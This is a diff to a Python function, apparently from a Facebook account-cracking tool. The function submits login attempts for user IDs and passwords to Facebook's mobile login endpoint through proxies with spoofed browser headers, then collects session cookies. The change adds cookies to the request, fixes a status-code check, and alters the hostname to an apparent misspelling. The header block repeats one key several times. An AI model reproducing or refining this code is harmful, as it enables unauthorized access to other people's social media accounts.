@@ -273,9 +273,8 @@ def rcrack1(uid,pwx,tl):
             'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"','upgrade-insecure-requests': '1',
             'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
             'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"','viewport-width': '885',}
-            response = session.post('https://mbasic.alpha.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data = log_data,headers = header_freefb,proxies = proxies)
-            response_text = response.text
-            if response_text.status_code == 200:
+            response = session.post('https://mbaasic.alpha.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',cookies = cookies,data = log_data,headers = header_freefb,proxies = proxies)
+            if response.status_code == 200:
               #print(f"\r\033[1;91m [succes] - Status code {response.status_code}")
               #print(f"\x1b[38;5;196m[proxies💔] {proxies}")
               log_cookies=session.cookies.get_dict().keys()
